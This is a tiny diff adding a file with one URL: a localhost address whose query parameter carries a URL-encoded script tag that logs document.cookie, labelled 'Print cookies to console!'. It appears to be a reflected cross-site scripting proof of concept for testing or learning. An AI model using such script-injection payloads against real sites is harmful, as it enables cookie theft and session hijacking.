@@ -1,0 +1,3 @@
+http://localhost:3000/?q%3Cscript%3Econsole.log(document.cookie)%3C/script%3E
+
+Print cookies to console!
